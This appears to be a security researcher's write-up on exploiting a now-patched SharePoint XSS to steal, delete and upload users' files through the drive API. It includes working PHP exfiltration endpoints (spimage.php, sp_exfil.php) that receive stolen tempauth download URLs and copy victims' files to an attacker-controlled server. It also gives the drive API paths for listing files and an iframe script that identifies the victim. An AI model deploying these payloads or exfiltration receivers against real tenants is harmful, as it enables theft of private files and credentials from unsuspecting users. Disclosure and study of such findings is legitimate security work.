# SharePoint JavaScript/API Investigation

Due to discovery of XSS in SharePoint on-premise and their hosted solutions, I was asked to see what could be done with the XSS. I hosted a few JavaScript files during the investigation since I was able to inject a script tag and use the src attribute to link to the hosted files.

I also was able to use a version of SharePoint that had the aspx file rendering and I was able to use that to create files with embedded payloads and made the files look like they belonged in SharePoint.

What was I able to do if a user accessed the XSS:
- Steal any user's files (hidden,private,public)
- Delete any user's files
- Upload any file to the user's sharepoint drive
- Anything else the API allowed us to do

The interactions happened against the drive API and also could be done using graphql.

## How could you steal file?
Well, the API created URLs with an authorization token. By stealing that URL, it was easy to just access

For the listing of all of a user's files, it was simple enough to just call out to the user's drive API (depends on API version):
- var t = "/_api/v2.1/drive/items/root";
- var t = "/_api/v2.0/drive/items/root/children";

There are just enough changes in version 2.0 to 2.1 of the drive API to have to write separate scripts.

The API provided us with a url with the tempauth parameter that allows anyone with that URL access the item for a decent amount of time.
```
https://REDACTED-my.sharepoint.com/personal/REDACTED/_layouts/15/download.aspx?UniqueId=REDACTED&Translate=false&tempauth=<<<<TOKEN!!!>>>>&ApiVersion=2.1
```

I also used a not so elegant version of the stealing of the token. It basically would show up as an image (`/tiny.png?steal_bs=`) access with a querystring stored in access.log. Then I decided it may be more useful to use a file such as spimage.php.

### What is in spimage.php?

```
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
header("Access-Control-Allow-Methods: *");
header('Content-Type: image/png');

$url = $_GET["auth_url"];
$file_name = $_GET["name"];
if(isset($_GET['auth_url']) && !empty($_GET['name']))
{
	$data = "<p><a href='".base64_decode($url)."'>".$file_name."</a></p>\r\n";
	file_put_contents('./REDACTED/xfil.html', $data , FILE_APPEND);
}
echo file_get_contents('http://REDACTED/tiny.png');
?>

```

### What is in sp_exfil.php
Well it is less elegant that the above...I don't like this one, but it is referrenced in the JavaScript.

```
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
header("Access-Control-Allow-Methods: *");
header('Content-Type: application/json');

$data = json_decode(file_get_contents('php://input'), true);
$url = $data["auth_url"];
$file_name = $data["name"];
echo './REDACTED/'.$file_name;
file_put_contents('./REDACTED/'.$file_name, file_get_contents($url));  
?>

```

## Upload and Delete
The Upload and Delete required obtaining tokens from another requests This can be seen in the following function calls of delete_files.js
- stealBearer
- getDigest

In the Upload I obtained the token in a slightly different way:
- getDigest

## Who is our victim?
The victim is anyone who accesses the XSS or pages (if you are able to use aspx). 

I did not have a lot of time to look into discovering who the victim would be, so I had to come up with a quick and dirty way of identifying them for requests needing their username:
```
document.write("<iframe src='/' id='whoareu' border=0 width=1 height=1></iframe>");const myTimeout = setTimeout(whoareu, 2000);
function whoareu() {
	var theurl=document.getElementById('whoareu').contentWindow.location.href;
	user = new URL(theurl).pathname.split('/')[2];
	// REST OF FUNCTION REMOVED AS NOT NECESSARY
}
```
In the above, I needed an iframe to hit the root of the SharePoint instance and it would redirect the user to their directory. Then I could parse the information out to be used for the Upload and Delete functions.

## What happened?
Well, the XSS was patched earlier this year and my other XSS findings in the past have been patched. Depending on deployment, you may be able to just create aspx files to embed your payloads. However, there are always 3rd party components that have plenty of bugs.

My favorite part while working on this was when it executed against someone I was testing with. I was able to download their keepass file that was only accessible to them.

